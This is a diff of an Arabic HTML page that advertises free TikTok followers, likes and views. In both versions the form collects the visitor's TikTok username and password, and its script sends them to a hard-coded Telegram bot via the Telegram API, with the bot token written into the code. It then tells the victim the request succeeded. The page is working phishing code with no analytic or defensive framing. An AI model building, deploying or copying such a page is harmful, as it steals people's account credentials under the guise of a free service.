@@ -1,44 +1,44 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<!DOCTYPE html><html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>رشق تيك توك</title>
   <style>
     body {
-      margin: 0;
-      font-family: sans-serif;
-      background-image: url('https://cdn.openai.com/chatgpt/image/5f37c36a-6ef1-4adf-9e59-6e2a882d1c7a.png');
+      background-image: url('https://i.ibb.co/NYbSY7q/tiktok-bg.png'); /* رابط الصورة المرفوعة سابقاً */
       background-size: cover;
-      background-position: top;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: flex-start;
-      height: 100vh;
+      background-repeat: no-repeat;
+      background-position: center;
+      font-family: Arial, sans-serif;
       color: white;
+      text-align: center;
+      direction: rtl;
     }
     .container {
-      background: rgba(0, 0, 0, 0.5);
-      margin-top: 200px;
+      margin-top: 300px;
+      background-color: rgba(0, 0, 0, 0.6);
       padding: 20px;
       border-radius: 15px;
       width: 90%;
-      max-width: 350px;
-      text-align: center;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
     }
-    h1 {
+    h2 {
       margin-bottom: 20px;
-      font-size: 24px;
-      color: #fff;
+      color: white;
     }
     input, select, button {
       width: 100%;
-      padding: 12px;
-      margin-bottom: 15px;
+      padding: 10px;
+      margin: 10px 0;
       border: none;
-      border-radius: 10px;
+      border-radius: 8px;
       font-size: 16px;
+    }
+    input, select {
+      background-color: white;
+      color: black;
     }
     button {
       background-color: #ff0050;
@@ -46,58 +46,48 @@
       cursor: pointer;
     }
     button:hover {
-      background-color: #e60047;
+      background-color: #e60045;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>رشق مجاني</h1>
-    <input type="text" id="username" placeholder="اسم المستخدم" required />
-    <input type="password" id="password" placeholder="كلمة المرور" required />
-    
-    <select id="amount">
-      <option value="1000">1000</option>
-      <option value="2000">2000</option>
-      <option value="5000">5000</option>
-    </select>
-    
-    <select id="type">
-      <option value="متابعين">متابعين</option>
-      <option value="لايكات">لايكات</option>
-      <option value="مشاهدات">مشاهدات</option>
-    </select>
-    
-    <button onclick="sendData()">تم</button>
-  </div>
+    <h2>رشق مجاني</h2>
+    <form action="https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage" method="post" target="_blank" onsubmit="sendToTelegram(event)">
+      <input type="text" id="username" placeholder="اسم المستخدم" required>
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+      <select id="count">
+        <option value="1000">1000</option>
+        <option value="2000">2000</option>
+        <option value="5000">5000</option>
+      </select>
+      <select id="type">
+        <option value="متابعين">متابعين</option>
+        <option value="لايكات">لايكات</option>
+        <option value="مشاهدات">مشاهدات</option>
+      </select>
+      <button type="submit">تم</button>
+    </form>
+  </div>  <script>
+    function sendToTelegram(event) {
+      event.preventDefault();
+      var username = document.getElementById('username').value;
+      var password = document.getElementById('password').value;
+      var count = document.getElementById('count').value;
+      var type = document.getElementById('type').value;
 
-  <script>
-    function sendData() {
-      const token = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
-      const chat_id = "7197079453";
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
-      const amount = document.getElementById("amount").value;
-      const type = document.getElementById("type").value;
-      
-      const message = `
-👤 يوزر: ${username}
-🔑 كلمة المرور: ${password}
-📦 الكمية: ${amount}
-📌 النوع: ${type}
-      `;
-      
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: chat_id,
-          text: message
-        })
-      }).then(res => alert("تم الإرسال بنجاح ✅"));
+      var message = `\u2728 تيك توك جديد:\n\n👤 يوزر: ${username}\n🔒 باسورد: ${password}\n📦 عدد: ${count}\n📌 نوع: ${type}`;
+
+      var telegramURL = `https://api.telegram.org/bot7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk/sendMessage?chat_id=7197079453&text=${encodeURIComponent(message)}`;
+
+      fetch(telegramURL)
+        .then(response => {
+          if (response.ok) {
+            alert("تم الإرسال بنجاح!");
+          } else {
+            alert("فشل الإرسال.");
+          }
+        });
     }
-  </script>
-</body>
+  </script></body>
 </html>
